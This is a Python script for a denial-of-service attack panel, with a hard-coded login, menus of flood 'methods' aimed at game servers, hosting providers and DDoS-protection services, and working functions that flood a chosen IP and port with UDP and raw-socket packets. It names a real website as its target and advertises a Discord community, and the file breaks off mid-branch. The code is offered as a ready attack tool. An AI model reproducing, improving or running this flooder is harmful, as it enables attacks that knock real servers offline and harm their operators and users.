#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#Tools by : ERROR 303
#projects tools
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json

os.system("cls")
#96m
print("""\033[36m
\033[50m
 █████                          ███               
░░███                          ░░░                
 ░███         ██████   ███████ ████  ████████     
 ░███        ███░░███ ███░░███░░███ ░░███░░███    
 ░███       ░███ ░███░███ ░███ ░███  ░███ ░███    
 ░███      █░███ ░███░███ ░███ ░███  ░███ ░███    
 ███████████░░██████ ░░███████ █████ ████ █████   
░░░░░░░░░░░  ░░░░░░   ░░░░░███░░░░░ ░░░░ ░░░░░    
                      ███ ░███                    
                     ░░██████                     
                      ░░░░░░  
    
\033[36m • TOOLS BY : \033[32mΣRROR 303
   
""")
username = str(input("\033[33m[LexxC2] \033[93mUsername:"))
password = str(input("\033[33m[LexC2] \033[93mPassword:"))
if password == "LexyyAja" and username == "Lexyy":
    print ("Logged In As Lexyy")
    time.sleep(2)

else:
    print ("\033[31mPassword Salah. Harap Login Kembali.")
    time.sleep(2)
    print ("\033[31WARNING !!!")
    time.sleep(1)
    print ("\033[32mOrang asing di larang masuk !!!")
    time.sleep(999)

os.system("cls")
print("\033[92mConnecting To Server [\033[97m•\033[92m]")
time.sleep(0.9)

os.system("cls")
print("Connecting To Server [\033[97m••\033[92m]")
time.sleep(0.9)

os.system("cls")
print("welcome Lexyy [\033[97m√\033[92m]")
time.sleep(0.9)

nicknm = "Fisika"

methods = """
\033[35m╔════════════════════════════════╗
\033[35m║ \033[36m---- \033[32mMethods List! \033[36m--- \033[35m   ║  
\033[35m║ \033[93mgen3   \033[36m> \033[32mShows Gen3 Methods!     \033[35m║
\033[35m║ \033[32mgen2   \033[36m> \033[32mShows Gen2 Methods!     \033[35m║
\033[35m║ \033[32mlayer4 \033[36m> \033[32mShows Layer 4 Methods!  \033[35m║
\033[35m║ \033[32mlayer7 \033[36m> \033[32mShows Layer 7 Methods!  \033[35m║
\033[35m║ \033[32mprivate\033[36m> \033[32mShows Private Methods!  \033[35m║
\033[35m║ \033[32mraw    \033[36m> \033[32mShows Raw Methods!      \033[35m║
\033[35m║ \033[32mmore   \033[36m> \033[32mShows More Methods!     \033[35m║
\033[35m╚══════════════════════════════════╝
"""

new = """ 
\033[35m╔═══════════════════════════╗
\033[35m║\033[32m ● /q , \033[36mTo quit \033[35m           ║
\033[35m║\033[32m ● riv , \033[36mNew Menthod \033[35m      ║
\033[35m║\033[32m ● Lxy , \033[36mNew Menthod \033[35m      ║
\033[35m║\033[32m ● 113 , \033[36mNew Menthod \033[35m      ║
\033[35m║\033[32m ● Pargoyy , \033[36mNew Menthod \033[35m  ║
\033[35m║\033[32m ● Uud , \033[36mNew Menthod \033[35m      ║
\033[35m║\033[32m ● Lex , \033[36mNew Menthod \033[35m      ║
\033[35m╚═══════════════════════════╝
"""

raw = """
\033[35m                              ╔═╗╦═╗ ╦\033[32m═╗╔═╗╦═╗
\033[35m                              ║╣ ╠╦╝ ╠\033[32m╦╝║ ║╠╦╝
\033[35m                              ╚═╝╩╚═ ╩\033[32m╚═╚═╝╩╚═

\033[35m            ╔══════════════════════════╦════════════════════════════╗
\033[35m            ║ \033[32mudpraw \033[36m- \033[32mRaw UDP Flood \033[35m  ║ \033[32mhexraw \033[36m- \033[32mRaw HEX Flood \033[35m    ║
\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[35m             ║ \033[32mtcpraw \033[36m- \033[32mRaw TCP Flood \033[35m║ ║ \033[32mvseraw \033[36m- \033[32mRaw VSE Flood \033[35m  ║
\033[35m             ║ \033[32mstdraw \033[36m- \033[32mRaw STD Flood \033[35m║ ║ \033[32msynraw \033[36m- \033[32mRaw SYN Flood \033[35m  ║
\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[35m            ║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚═══════════════════════════════════════════════════════╝
"""

gen3 = """
\033[35m                               ╔═╗╦═╗ ╦\033[32m═╗╔═╗╦═╗
\033[35m                               ║╣ ╠╦╝ ╠\033[32m╦╝║ ║╠╦╝
\033[35m                               ╚═╝╩╚═ ╩\033[32m╚═╚═╝╩╚═

\033[35m            ╔══════════════════════════╦════════════════════════════╗
\033[35m            ║ \033[32movhslav \033[36m- \033[32mSlavic Flood \033[35m  ║ \033[32miotv1 \033[36m- \033[32mCustom Method!  \033[35m   ║
\033[35m            ║ \033[32mcpukill \033[36m- \033[32mCpu Rape Flood\033[35m ║ \033[32miotv2 \033[36m- \033[32mCustom Method!  \033[35m   ║
\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[35m             ║ \033[32mfivemkill \033[36m- \033[32mFivem Kill \033[35m║ ║ \033[32miotv3 \033[36m-\033[32m Custom Method!  \033[35m ║
\033[35m             ║ \033[32micmprape  \033[36m- \033[32mICMP Rape  \033[35m║ ║ \033[32mssdp  \033[36m-\033[32m Amped SSDP      \033[35m ║
\033[35m             ║ \033[32mtcprape \033[36m- \033[32mRaping TCP   \033[35m║ ║ \033[32marknull \033[36m- \033[32mArk Method    \033[35m ║
\033[35m             ║ \033[32mnforape \033[36m- \033[32mNfo Method   \033[35m║ ║ \033[32m2kdown  \033[36m- \033[32mNBA 2K Flood  \033[35m ║
\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[35m            ║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚═══════════════════════════════════════════════════════╝
"""

private = """
\033[35m                              ╔═╗╦═╗ ╦\033[32m═╗╔═╗╦═╗
\033[35m                              ║╣ ╠╦╝ ╠\033[32m╦╝║ ║╠╦╝
\033[35m                              ╚═╝╩╚═ ╩\033[32m╚═╚═╝╩╚═

\033[35m            ╔══════════════════════════╦════════════════════════════╗
\033[35m            ║ \033[32mhomeslap    \033[36m. \033[32mr6kill     \033[35m║ \033[32mfivemtcp  \033[36m. \033[32mnfokill       \033[35m ║
\033[35m            ║ \033[32mark255      \033[36m. \033[32marklift    \033[35m║ \033[32mhotspot   \033[36m. \033[32mvpn           \033[35m ║
\033[35m            ║ \033[32mhydrakiller \033[36m. \033[32markdown    \033[35m║ \033[32mnfonull   \033[36m. \033[32mdhcp          \033[35m ║
\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[35m             ║ \033[32movhnat    \033[36m. \033[32movhamp     \033[35m║ ║ \033[32movhwdz    \033[36m. \033[32movhx         \033[35m║
\033[35m             ║ \033[32mnfodrop   \033[36m. \033[32mnfocrush   \033[35m║ ║ \033[32mnfodown   \033[36m. \033[32mnfox         \033[35m║
\033[35m             ║ \033[32mudprape   \033[36m. \033[32mudprapev3  \033[35m║ ║ \033[32mfortnite  \033[36m. \033[32mfortnitev2   \033[35m║
\033[35m             ║ \033[32mudprapev2 \033[36m. \033[32mudpbypass  \033[35m║ ║ \033[32mgreeth    \033[36m. \033[32mtelnet       \033[35m║
\033[35m             ║ \033[32mfivemv2   \033[36m. \033[32mr6drop     \033[35m║ ║\033[32m r6freeze  \033[36m. \033[32mkillall      \033[35m║
\033[35m             ║ \033[32m2krape    \033[36m. \033[32mfallguys   \033[35m║ ║ \033[32movhdown   \033[36m. \033[32movhkill      \033[35m║
\033[35m             ║ \033[32mfivemrape \033[36m. \033[32mfivemdown  \033[35m║ ║ \033[32mfivemv1   \033[36m. \033[32mfivemslump   \033[35m║
\033[35m             ║ \033[32mkillallv2 \033[36m. \033[32mkillallv3  \033[35m║ ║ \033[32mpowerslap \033[36m. \033[32mrapecom      \033[35m║
\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[35m            ║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚═══════════════════════════════════════════════════════╝
"""

layer4 = """
\033[35m                              ╔═╗╦═╗ ╦\033[32m═╗╔═╗╦═╗
\033[35m                              ║╣ ╠╦╝ ╠\033[32m╦╝║ ║╠╦╝
\033[35m                              ╚═╝╩╚═ ╩\033[32m╚═╚═╝╩╚═

\033[35m            ╔══════════════════════════╦════════════════════════════╗
\033[35m            ║  \033[32mudp \033[36m[IP] [TIME] [PORT]  \033[35m║   \033[32mvse \033[36m[IP] [TIME] [PORT]   \033[35m║
\033[35m            ║  \033[32mtcp \033[36m[IP] [TIME] [PORT]  \033[35m║   \033[32mack \033[36m[IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[35m             ║ \033[32mstd \033[36m[IP] [TIME] [PORT] \033[35m║ ║ \033[32mdns \033[36m[IP] [TIME] [PORT]   \033[35m║
\033[35m             ║ \033[32msyn \033[36m[IP] [TIME] [PORT] \033[35m║ ║ \033[32movh \033[36m[IP] [TIME] [PORT]   \033[35m║
\033[35m             ║\033[36m- - - - - - - \033[93mhomerape \033[32m[IP] [TIME] [PORT] \033[36m- - - - - -\033[35m║
\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[35m            ║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚═══════════════════════════════════════════════════════╝
"""

help = """
\033[35m                ╔═╗╦═╗ ╦\033[32m═╗╔═╗╦═╗
\033[35m                ║╣ ╠╦╝ ╠\033[32m╦╝║ ║╠╦╝
\033[35m                ╚═╝╩╚═ ╩\033[32m╚═╚═╝╩╚═
\033[35m     ╔═══════════════════════════════════╗
\033[35m     ║ \033[36m---- \033[32mMenu help Tools \033[36m--- \033[35m         ║
\033[35m     ║ \033[93mgen3   \033[36m> \033[32mShows Gen3 Methods!     \033[35m ║
\033[35m     ║ \033[32mgen2   \033[36m> \033[32mShows Gen2 Methods!     \033[35m ║
\033[35m     ║ \033[32mlayer4 \033[36m> \033[32mShows Layer 4 Methods!  \033[35m ║
\033[35m     ║ \033[32mlayer7 \033[36m> \033[32mShows Layer 7 Methods!  \033[35m ║
\033[35m     ║ \033[32mprivate\033[36m> \033[32mShows Private Methods!  \033[35m ║
\033[35m     ║ \033[32mraw    \033[36m> \033[32mShows Raw Methods!      \033[35m ║
\033[35m     ║ \033[32mmore   \033[36m> \033[32mShows More Methods!     \033[35m ║
\033[35m     ╚═══════════════════════════════════╝

\033[31mNew code By : ΣRROR 303
\033[35m       ╔═══════════════════════════╗
\033[35m       ║\033[32m ● /q , \033[36mTo quit \033[35m           ║
\033[35m       ║\033[32m ● riv , \033[36mNew Menthod \033[35m      ║
\033[35m       ║\033[32m ● Lxy , \033[36mNew Menthod \033[35m      ║
\033[35m       ║\033[32m ● 113 , \033[36mNew Menthod \033[35m      ║
\033[35m       ║\033[32m ● Pargoyy , \033[36mNew Menthod \033[35m  ║
\033[35m       ║\033[32m ● Uud , \033[36mNew Menthod \033[35m      ║
\033[35m       ║\033[32m ● Lex , \033[36mNew Menthod \033[35m      ║
\033[35m       ╚═══════════════════════════╝

\033[35m            ╔═══════════════════════════════════════════════════════╗
\033[35m            ║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚═══════════════════════════════════════════════════════╝
"""

layer7 = """
\033[35m                                 ╔═╗╦═╗ ╦\033[32m═╗╔═╗╦═╗
\033[35m                                 ║╣ ╠╦╝ ╠\033[32m╦╝║ ║╠╦╝
\033[35m                                 ╚═╝╩╚═ ╩\033[32m╚═╚═╝╩╚═

\033[0;36m            ╔══════════════════════════╦════════════════════════════╗
\033[0;36m            ║  \033[0;34mhttp-stm \033[36m[IP] [TIME] [PORT]  \033[0;36m	       		 
\033[0;36m            ║  \033[0;34mhttp-cld \033[36m[IP] [TIME] [PORT]  \033[0;36m		
\033[0;36m            ╚╦════════════════════════╦╩╦═════════════════════════╦╝
\033[0;36m             ║ \033[0;34mddos-guard \033[36m[IP] [TIME] [PORT] \033[0;36m                           
\033[0;36m             ║ \033[0;34mcloudflare \033[36m[IP] [TIME] [PORT] \033[0;36m                             
\033[0;36m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[0;36m            ║    \033[0;34mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[0;36m║
\033[0;36m            ╚═══════════════════════════════════════════════════════╝
"""

done = """"
\033[35m                              ╔═╗╦═╗ ╦\033[32m═╗╔═╗╦═╗
\033[35m                              ║╣ ╠╦╝ ╠\033[32m╦╝║ ║╠╦╝
\033[35m                              ╚═╝╩╚═ ╩\033[32m╚═╚═╝╩╚═
\033[35m                     ╔═════════════════════════════════════╗
\033[35m                     ║\033[32mAWAS MATI TUH SER\033[36mVERR SEE YOUU BADUTT║
\033[35m                     ╚═════════════════════════════════════╝
"""

pcl = """\033[31m[BOT] \033[30m• \033[36mSUCCES ATTACK BY ERROR 303"""

target = """
\033[31mMY TARGET
\033[32mSAMP = IP:PORT : \033[33msoon
\033[32mWEB = HTTP : \033[36mhttps://xnxx.com
"""
cd = """                        .
\033[35m                                 ╔═╗╦═╗ ╦\033[32m═╗╔═╗╦═╗
\033[35m                                 ║╣ ╠╦╝ ╠\033[32m╦╝║ ║╠╦╝
\033[35m                                 ╚═╝╩╚═ ╩\033[32m╚═╚═╝╩╚═

\033[35m[BOT] • wait for second
"""

cd1 = """
\033[35m[BOT] • Don't forget to join my community : \033[36mhttps://discord.gg/QHPUvsYUVt
"""
cd2 = """                        .
             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |  I LOVE DDOS!   |  |  |     |         |      |
     |  |  Bad command or |  |  |/----|`---=    |      |
     |  |  C:\>_Anonymous |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
This is Anonymous: OpIcarus has started!
"""

banner =  """
\033[35m                               ╔═╗╦═╗ ╦\033[32m═╗╔═╗╦═╗
\033[35m                               ║╣ ╠╦╝ ╠\033[32m╦╝║ ║╠╦╝
\033[35m                               ╚═╝╩╚═ ╩\033[32m╚═╚═╝╩╚═
\033[35m                 ╔═══════════════════════════════════════════════╗
\033[35m                 ║\033[31m- - - - - - - \033[32mKZEv2 By \033[36m@ΣRROR 303\033[31m - - - - - - -\033[35m║
\033[35m                 ║\033[31m- - - - \033[32mGa bisa ? \033[36mPm me \033[32m@ΣRROR 303#3348\033[31m - - - -\033[35m║
\033[35m                 ╚═══════════════════════════════════════════════╝
\033[35m                    ╔════════════════════════════════════════╗
\033[35m                    ║\033[31m- -\033[32mATTACKING SERVER \033[36m(\033[31mAWAS DOWN BWANG\033[36m)\033[31m- -\033[35m║
\033[35m                    ╚════════════════════════════════════════╝

\033[31mINFO :
\033[35m╔══════════════════╗
\033[35m║\033[36m ➤ /q , \033[32mTo quit \033[35m  ║
\033[35m╚══════════════════╝
   \033[36m➤TOOLS BY : \033[32mΣRROR 303"""

cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
#bawaan 32500,4150
#kaltebg tembus 23100,32100
#ERROR 303 25100,52100
	while True:
		bots = (random.randint(23100,32100))
		sys.stdout.write("\x1b]2;Lex. | Devices: [{}] | Spoofed Servers [19] | Server Units [8] | Clients: [18]\x07".format (bots))
		sin = input("\033[32m[\033[35m{}\033[32m@Lexyy]\033[36m$ \033[96m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "c":
			os.system ("cls")
			print (banner)
			main()
		if sinput == "t":
			os.system ("cls")
			print (banner)
			main()
		if sinput == "target":
			os.system ("cls")
			print (target)
			main()
		if sinput == "layer7":
			os.system ("cls")
			print (layer7)
			main()
		if sinput == "help":
			os.system ("cls")
			print (help)
			main()
		if sinput == "new":
			os.system ("cls")
			print (new)
			main()
		elif sinput == "?":
			os.system ("cls")
			print (methods)
			main()
		elif sinput == "layer4":
			os.system ("cls")
			print (layer4)
			main()
		elif sinput == "method":
			os.system ("cls")
			print (methods)
			main()
		elif sinput == "private":
			os.system ("cls")
			print (private)
			main()
		elif sinput == "gen3":
			os.system ("cls")
			print (gen3)
			main()
		elif sinput == "raw":
			os.system ("cls")
			print (raw)
			main()
		elif sinput == "":
			main()
		elif sinput == "/q":
			os.system ("cls")
			exit()
		elif sinput == "std":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "dns":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vse":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "syn":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mATTACKING SERVER !!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 45600
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mATTACKING SERVER !!")
					print (done)
					time.sleep(2)
					print (pcl)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "Lxy":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "http-stm":
			try:
				if running >= 20000:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mATTACKING SERVER !!")
					os.system('cls')
					print(done)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "http-cld":
			try:
				if running >= 20000:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mATTACKING SERVER !!")
					os.system('cls')
					print(done)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ddos-guard":
			try:
				if running >= 20000:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mATTACKING SERVER !!")
					os.system('cls')
					print(done)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cloudflare":
			try:
				if running >= 20000:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mATTACKING SERVER !!")
					os.system('cls')
					print(done)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "113":
			try:
				if running >= 10000:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1945
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "Pargoyy":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 4555
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "uud":
			try:
				if running >= 10:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 27000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "Lex":
			try:
				if running >= 10000:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 2600
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "homeslap":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 2048
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
#new update
		elif sinput == "udp":
			fake_ip = '157.230.45.130'
			fake_ip2 = '51.78.222.09'
			fake_ip3 = '139.789.222.098'
			fake_ip4 = '165.229.290.12'
			try:
				if running >= 5000:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1465
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mATTACKING SERVER !!")
					print (cd)
					time.sleep(1)
					print (cd1)
					time.sleep(3)
					print (cd2)
					time.sleep(1)
					print (done)
					time.sleep(1)
					print (pcl)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "riv":
			try:
				if running >= 20000:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv2":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv3":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprape":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 0
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev2":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpbypass":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "icmprape":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1024
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev3":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfodrop":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mATTACKING SERVER !!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnat":
			try:
				if running >= 1:
					print("\033[97mTAHAN BENTAR.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
